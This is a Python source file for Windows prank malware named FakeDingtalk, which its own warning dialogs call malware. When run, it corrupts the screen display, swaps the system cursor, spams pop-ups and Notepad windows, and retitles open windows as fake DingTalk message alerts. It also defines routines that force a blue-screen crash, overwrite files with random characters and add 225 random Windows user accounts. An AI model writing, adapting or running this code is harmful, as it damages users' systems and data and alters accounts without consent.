
import getpass
import string
from ctypes import *

dll = windll.LoadLibrary("user32.dll")
ntdll = windll.LoadLibrary("ntdll.dll")
gdidll = windll.LoadLibrary("gdi32.dll")
winmmdll = windll.LoadLibrary("winmm.dll")
kerdll = windll.LoadLibrary("kernel32.dll")

class CWPSTRUCT(Structure):
    _fields_ = [
        ('lParam', c_long),
        ('wParam', c_long),
        ('message', c_long),
        ('hwnd', c_long),
    ]

def prewarning():       
    if checkinfo():
        if not is_admin():
            if win32gui.MessageBox(0,
                               "This program recommend uae admin to run"
                               "\nStill run it?",
                               "FakeDingtalk", 0x34) == 7:
                return False
        if win32gui.MessageBox(0,
                               "This program is not a JOKE! Still run it?\n"
                               "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE USING THIS MALWARE\n"
                               "Please use a safe environment to test!\n\n\n"
                               "这个程序没有在开玩笑\n***还要运行吗???***\n"
                               "创作者OrangePie不对任何使用该程序时造成的破坏负责\n"
                               "请使用安全环境来测试程序\n", "FakeDingtalk", 0x34) == 6:
            if win32gui.MessageBox(0,
                                   "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE USING THIS MALWARE!\n"
                                   "Please click cancel to still run it.\n"
                                   "创作者OrangePie不对任何使用该程序时造成的破坏负责\n"
                                   "点击取消来运行", "FakeDingtalk", 0x34) == 7:
                print("Running Program!")
                return True
    else:
        win32gui.MessageBox(0,
                            "This program need Windows 7 or later system!"
                            "\n"
                            "此应用需要Windows7或更新的系统",
                            "Dingtalk", 0x34)
    return False

import win32gui, win32api, win32con
import math


import ctypes
import os
import random
import winsound
from ctypes import wintypes

lpWebsites = [
    "https://search.bilibili.com/all?keyword=OrangePie",
    "https://space.bilibili.com/114514",
    "https://www.bilibili.com/video/BV114514",
    "https://space.bilibili.com/102499223/",
    "https://space.bilibili.com/401094700/fans/fans"
]

website_len = 5

WebsiteNames = [
    "度",
    "2233",
    "咕鸽",
    "必应",
    "360",
    "OranPie"
]

screen_width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
screen_height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
wide = screen_width
high = screen_height

hdc = win32gui.GetWindowDC(win32gui.GetDesktopWindow())
HDC = hdc
HWND = ""



def RecycleBin():
    LPWSTR = ctypes.c_wchar_p
    LMEM_ZEROINIT = 0x40
    SHCNE_ASSOCCHANGED = 0x08000000
    SHCNF_FLUSH = 0x1000

    lpPath = ctypes.cast(ctypes.windll.kernel32.LocalAlloc(LMEM_ZEROINIT, 4096), LPWSTR)
    lpNewPath = ctypes.cast(ctypes.windll.kernel32.LocalAlloc(LMEM_ZEROINIT, 4096), LPWSTR)

    ctypes.windll.kernel32.GetEnvironmentVariableW("userprofile", lpPath, 2048)
    os.path.join(lpPath.value, "Desktop")

    for i in range(64):
        new_path = f"{lpPath.value}\\回收站{i + 1}.{{645FF040-5081-101B-9F08-00AA002F954E}}"
        ctypes.windll.kernel32.CreateDirectoryW(new_path, None)
        if i % 8 == 7:
            ctypes.windll.shell32.SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSH, None, None)
        time.sleep(0.1)

def memzInit():
    global w, h
    user32 = ctypes.windll.user32
    w = user32.GetSystemMetrics(0)  # SM_CXSCREEN
    h = user32.GetSystemMetrics(1)  # SM_CYSCREEN

def load_icon_from_file(icon_path):
    hicon = dll.LoadImageW(
        None,  # hInstance
        icon_path,  # lpszName
        win32con.IMAGE_ICON,  # uType
        0,  # cxDesired
        0,  # cyDesired
        win32con.LR_LOADFROMFILE  # fuLoad
    )
    if not hicon:
        raise RuntimeError()
    return hicon
def Circle():
    user32 = ctypes.windll.user32
    ix = user32.GetSystemMetrics(11) // 2  # SM_CXICON
    iy = user32.GetSystemMetrics(12) // 2  # SM_CYICON
    idx = 0
    class Point(Structure):
        _fields_ = [("x", c_long), ("y", c_long)]
    q  = Point(0,0)

    while True:
        idx += 1
        if idx > 9:
            idx = 0
        if idx == 7:
            hIcon = load_icon_from_file("./di.ico")
        elif idx == 8:
            hIcon = load_icon_from_file("./di2.ico")
        elif idx == 9:
            hIcon = load_icon_from_file("./di3.ico")
        else:
            hIcon = user32.LoadIconW(0, 32512 + idx)

        p = q
        for i in range(0, 101, 10):
            user32.GetCursorPos(pointer(p))
            j = math.sqrt(10000 - i * i)
            user32.DrawIconEx(user32.GetDC(0), (p.x + i - ix)*2, (p.y + int(j) - iy)*2, hIcon, 0, 0, 0, 0, 0x0003)
            time.sleep(0.01)
        for i in range(100, -1, -10):
            user32.GetCursorPos(pointer(p))
            j = -math.sqrt(10000 - i * i)
            user32.DrawIconEx(user32.GetDC(0), (p.x + i - ix)*2, (p.y + int(j) - iy)*2, hIcon, 0, 0, 0, 0, 0x0003)
            time.sleep(0.01)
        for i in range(0, -101, -10):
            user32.GetCursorPos(pointer(p))
            j = -math.sqrt(10000 - i * i)
            user32.DrawIconEx(user32.GetDC(0), (p.x + i - ix)*2, (p.y + int(j) - iy)*2, hIcon, 0, 0, 0, 0, 0x0003)
            time.sleep(0.01)
        for i in range(-100, 1, 10):
            user32.GetCursorPos(pointer(p))
            j = math.sqrt(10000 - i * i)
            user32.DrawIconEx(user32.GetDC(0), (p.x + i - ix)*2, (p.y + int(j) - iy)*2, hIcon, 0, 0, 0, 0, 0x0003)
            time.sleep(0.01)

def draw_rainbow():
    rainbow_colors = [(255, 0, 0), (255, 127, 0), (255, 255, 0),
                  (0, 255, 0), (0, 255, 255), (0, 0, 255),
                  (75, 0, 130), (148, 0, 211), (255, 20, 147),
                  (255, 165, 0), (255, 215, 0), (124, 252, 0),
                  (0, 128, 0), (0, 255, 127), (0, 128, 128),
                  (0, 0, 128), (128, 0, 128), (128, 0, 0),
                  (255, 0, 255), (128, 128, 0), (128, 0, 0),
                  (255, 182, 193), (255, 255, 224), (255, 228, 181),
                  (255, 99, 71), (255, 69, 0), (255, 140, 0),
                  (255, 255, 0), (154, 205, 50), (85, 107, 47),
                  (127, 255, 212), (72, 209, 204), (64, 224, 208),
                  (0, 206, 209), (32, 178, 170), (47, 79, 79),
                  (0, 0, 139), (0, 139, 139), (0, 255, 255),
                  (0, 255, 255), (0, 128, 128), (0, 0, 205),
                  (0, 191, 255), (0, 0, 128), (25, 25, 112),
                  (102, 51, 153), (128, 0, 0), (255, 255, 255)]
    for i in range(1000):
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        radius = random.randint(10, 50)
        color = random.choice(rainbow_colors)
        brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
        win32gui.SelectObject(hdc, brush)
        win32gui.Ellipse(hdc, x, y, x + radius, y + radius)
        win32gui.DeleteObject(brush)

def open_websites():
    while True:
        for i in range(website_len):
            os.startfile(lp_websites[i])
            time.sleep(2)

# 定义黑洞效果函数
def Blackhole():
    w = random.randint(100, 250)
    h = random.randint(100, 250)
    cx = random.randint(0, 800)
    cy = random.randint(0, 800)
    ckb = w / h
    for i in range(w // 2):
        color = (0, 0, 0)  # 黑色
        hBrush = win32gui.CreateSolidBrush(win32api.RGB(*color))
        win32gui.SelectObject(hdc, hBrush)
        win32gui.Ellipse(hdc, round(cx - i * ckb), round(cy - i), round(cx + i * ckb), round(cy + i))
        win32gui.DeleteObject(hBrush)
        time.sleep(0.05)

def cursor():
    class Point(Structure):
        _fields_ = [("x", c_long), ("y", c_long)]
    q  = Point(0,0)
    dll.GetCursorPos(pointer(q))
    v2 = 10
    v3 = random.randint(0, v2)
    v5 = random.randint(0, v2)
    v7 = random.randint(0, 1000)
    v11 = q.y + v3 * (v7 % 3 - 1)
    v9 = random.randint(0, 1000)
    v12 = q.x + v5 * (v9 % 3 - 1)
    dll.SetCursorPos(v11, v12)
def smashfile(file):
    with open(file, "w") as f:
        for i in range(random.randint(0, 2000)):
            f.write(random.choice(list(string.punctuation + string.ascii_letters + string.digits + string.hexdigits + string.octdigits)))


def some_user():

    #os.system("net user NoEscape death /add")
    # warning

    user = getpass.getuser()
    p = "!#()_"
    ua = list(p + string.ascii_letters + string.digits)
    del_bat = True

    for i in range(225):
        st = ""
        for j in range(20):
            st += random.choice(ua)
        ps = ""
        for j in range(14):
            ps += random.choice(ua)
        print(f"net user {''.join(st)} {''.join(ps)} /add")
        subprocess.run(f"net user {st} {ps} /add")
        if del_bat:
            a = open("del_bat.bat", "a")
            print(f"net user {st} /delete", file=a)

def blue():
    ntdll = ctypes.windll.ntdll
    RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
    NtRaiseHardError = ntdll.NtRaiseHardError

    ErrKill = ctypes.c_ubyte()
    HDErr = ctypes.c_ulong()

    # Adjust privilege
    RtlAdjustPrivilege(0x13, True, False, ctypes.byref(ErrKill))

    # Raise hard error
    NtRaiseHardError(0xc0000233, 0, 0, 0, 6, ctypes.byref(HDErr))

import time
import subprocess
import threading

def open_notepad_with_message(message):
    subprocess.Popen(['notepad.exe', 'message.txt'])
    time.sleep(1)  # Wait for Notepad to open
    with open('message.txt', 'w') as file:
        file.write(message)

def kill_notepad_process():
    subprocess.run(['taskkill', '/F', '/IM', 'notepad.exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def popup_message_every_20_seconds():
    message = ("假的！阿里巴巴的骗局不要信：你的电脑被\"FakeDingTalk\"汐了!!!\n\
但是这是一个“安全”的OrangePie特效组。\n\
你可以随时关闭它，除蓝屏强制关机外不会对电脑造成任何损害。\n\n\
"
               "信息：版本2024.0.01(0518-op)"
               "\n禁用所有疑似可对电脑造成伤害的函数-Safe Mode"
               "\n随机调用"
               "\n\n Made by OrangePie \n Fake Dingtalk")
    while True:
        open_notepad_with_message(message)
        time.sleep(2.5)
        kill_notepad_process()

def run_popup_thread():
    popup_thread = threading.Thread(target=popup_message_every_20_seconds)
    popup_thread.daemon = True
    popup_thread.start()

def is_windows_7_or_later():
    os_version_info = ctypes.create_string_buffer(26)
    ctypes.windll.ntdll.RtlGetVersion(ctypes.byref(os_version_info))
    major_version = ord(os_version_info[4])
    if major_version >= 6:
        return True
    return False

def is_uac_enabled():
    uac_enabled = ctypes.windll.shell32.IsUserAnAdmin()
    if uac_enabled:
        return True
    return False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except:
        return False

def checkinfo():
    if is_windows_7_or_later():
        print("The system is running Windows 7 or later.")
    else:
        print("The system is running an older version of Windows.")
        return False

    if is_uac_enabled():
        print("User Account Control (UAC) is enabled.")
    else:
        print("User Account Control (UAC) is not enabled.")

    if is_admin():
        print("The current process has administrator privileges.")
    else:

        print("The current process does not have administrator privileges.")
        return True

    return True
def desktop_small():
    v1 = HWND
    v2 = HDC
    class RECT(Structure):
        _fields_ = [
            ("left", c_long),
            ("top", c_long),
            ("right", c_long),
            ("bottom", c_long)
        ]
    Rect = RECT(random.randint(0, wide), random.randint(0, high), random.randint(0, wide), random.randint(0, high))

    v1 = dll.GetDesktopWindow()
    v2 = dll.GetWindowDC(v1)
    gdidll.StretchBlt(v2, 50, 50, Rect.right - 100, Rect.bottom - 100, v2, 0, 0, Rect.right, Rect.bottom, 0xCC0020)
    dll.ReleaseDC(v1, v2)

def set_cursor_type():
    while True:
        ctypes.windll.user32.SetSystemCursor(
            ctypes.windll.user32.LoadCursorW(None, random.choice(
                [win32con.IDC_APPSTARTING, win32con.IDC_ARROW, win32con.IDC_CROSS,
                 win32con.IDC_HAND, win32con.IDC_HELP, win32con.IDC_IBEAM,
                 win32con.IDC_NO, win32con.IDC_SIZEALL, win32con.IDC_SIZENESW,
                 win32con.IDC_SIZENS, win32con.IDC_SIZENWSE, win32con.IDC_SIZEWE,
                 win32con.IDC_UPARROW, win32con.IDC_WAIT])), 32512)
        time.sleep(0.01)

def desktop():
    class RECT(Structure):
        _fields_ = [
            ("left", c_long),
            ("top", c_long),
            ("right", c_long),
            ("bottom", c_long)
        ]
    v0 = HWND
    v1 = HDC
    Rect = RECT(random.randint(0, wide), random.randint(0, high), random.randint(0, wide), random.randint(0, high))
    v0 = dll.GetDesktopWindow()
    v1 = dll.GetWindowDC(v0)
    gdidll.BitBlt(v1, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, v1, 0, 0, 0x330008)
    dll.ReleaseDC(v0, v1)

def drawIco():
    hWnd = HWND
    iconw = c_int
    iconh = c_int
    class Point(Structure):
        _fields_ = [("x", c_long), ("y", c_long)]
    p = Point(0,0)
    iconw = dll.GetSystemMetrics(11) / 2
    iconh = dll.GetSystemMetrics(12) / 2
    hWnd = dll.GetDesktopWindow()
    v2 = dll.GetWindowDC(hWnd)
    dll.GetCursorPos(pointer(p))
    hicon1 = dll.LoadIconW(0, 0x7F01)
    hicon2 = load_icon_from_file("./di.ico")
    hicon3 = load_icon_from_file("./di2.ico")
    hicon4 = load_icon_from_file("./di3.ico")
    dll.DrawIcon(v2, int(p.x - iconw), int(p.y - iconh), hicon1)
    dll.DrawIcon(v2, int(p.x - iconw), int(p.y - iconh), hicon2)
    dll.DrawIcon(v2, int(p.x - iconw), int(p.y - iconh), hicon3)
    dll.DrawIcon(v2, int(p.x - iconw), int(p.y - iconh), hicon4)
    
    hicon0 = dll.LoadIconW(0, 0x7F03)
    x = random.randint(0, wide)
    y = random.randint(0, high)
    dll.DrawIcon(v2, x, y, hicon2)
    dll.DrawIcon(v2, x, y, hicon1)
    dll.DrawIcon(v2, x, y, hicon3)
    dll.DrawIcon(v2, x, y, hicon4)
    dll.DrawIcon(v2, x, y, hicon0)

def desk_copy():
    v1 = HWND
    v2 = HDC
    class RECT(Structure):
        _fields_ = [
            ("left", c_long),
            ("top", c_long),
            ("right", c_long),
            ("bottom", c_long)
        ]
    Rect = RECT(random.randint(100, wide), random.randint(100, high), random.randint(100, wide), random.randint(100, high))

    v1 = dll.GetDesktopWindow()
    v2 = dll.GetWindowDC(v1)
    x = random.randint(0, Rect.right - 100)
    y = random.randint(0, Rect.bottom - 100)
    m = random.randint(0, 600)
    n = random.randint(0, 600)
    p = random.randint(0, Rect.right - 100)
    q = random.randint(0, Rect.bottom - 100)
    gdidll.BitBlt(v2, x, y, m, n, v2, p, q, 0xCC0020)

def sound():
    s = [winsound.MB_OK, winsound.MB_ICONHAND, winsound.MB_ICONQUESTION, winsound.MB_ICONEXCLAMATION]
    s1 = random.choice(s)
    winsound.MessageBeep(type=s1)


def moveWindow(hwnd, x, y, width, height):
    win32gui.MoveWindow(hwnd, x, y, width, height, True)


def getWindowSize(hwnd):
    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
    return right - left, bottom - top


def moveWindowWithoutResize(hwnd, x, y):
    width, height = getWindowSize(hwnd)
    moveWindow(hwnd, x, y, width, height)
def randomtype():
    return eval("0x1{}{}{}".format(random.randint(0,2), random.randint(1, 4), random.randint(0, 6)))

def win():
    title = str(random.randint(0, 114514))
    import threading
    th = threading.Thread(target=win32gui.MessageBox, args=(0, u"Still using this computer?", title, randomtype()))
    th.setDaemon(True)
    th.start()
    time.sleep(0.3)
    try:
        moveWindowWithoutResize(win32gui.FindWindow(None, title), random.randint(0, screen_width), random.randint(0, screen_height))
        win32gui.SetWindowText(win32gui.FindWindow(None, title), "lol")
    except:
        win()
        return
def re(hwnd, param):
    #length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    #buff = ctypes.create_unicode_buffer(length + 1)
    #ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    #window_title = buff.value
    #print(window_title)
    random_title = "钉钉发来{}条消息".format(random.randint(0,114514))
    ctypes.windll.user32.SetWindowTextW(hwnd, random_title)
def create_icons():
    while True:
        for _ in range(30):
            random_icon = random.choice([32512, 32513, 32514, 32515, 32516, 32517])
            hicon = ctypes.windll.user32.LoadIconW(None, random_icon)
            x = random.randint(0, screen_width - 32)
            y = random.randint(0, screen_height - 32)
            ctypes.windll.user32.DrawIconEx(ctypes.windll.user32.GetDC(0), x * 2, y * 2, hicon, 32, 32, 0, 0, 3)
            time.sleep(0.01)
def clear_drawn_icons():
    hdc = ctypes.windll.user32.GetDC(0)
    screen_width = ctypes.windll.user32.GetSystemMetrics(win32con.SM_CXSCREEN)
    screen_height = ctypes.windll.user32.GetSystemMetrics(win32con.SM_CYSCREEN)
    
    rect = ctypes.wintypes.RECT(0, 0, random.randint(0, screen_width), random.randint(0, screen_height))
    
    ctypes.windll.user32.InvalidateRect(0, ctypes.byref(rect), True)
    ctypes.windll.user32.UpdateWindow(0)
    ctypes.windll.user32.ReleaseDC(0, hdc)
def set_wallpaper(image_path):
    # Check if the file exists
    if not os.path.isfile(image_path):
        raise FileNotFoundError(f"The file {image_path} does not exist.")

    # SPI_SETDESKWALLPAPER = 20
    # Update the user profile with SPIF_UPDATEINIFILE and SPIF_SENDWININICHANGE
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

def main():
    f = [
        # Blackhole,
        cursor,
        win,
        desktop, # print
        desktop_small,
        # Blackhole,
        cursor,
        win,
        desktop,
        desktop_small,
        drawIco,
        sound,
        desk_copy,
        # draw_rainbow, fix thread handle not vaild err
        clear_drawn_icons,
        clear_drawn_icons,
        clear_drawn_icons,
        lambda: win32gui.EnumChildWindows(win32gui.GetDesktopWindow(), re, 0),
        ]
    import threading
    if prewarning():
        # RecycleBin()
        th = threading.Thread(target=popup_message_every_20_seconds, daemon=True)
        th.start()
        th = threading.Thread(target=Circle, daemon=True)
        th.start()
        th = threading.Thread(target=create_icons, daemon=True)
        th.start()
        th = threading.Thread(target=set_cursor_type, daemon=True)
        th.start()
        for i in range(250):
            import threading
            th = threading.Thread(target=random.choice(f), daemon=False)
            th.start()
            time.sleep(0.1)

main()

            
            
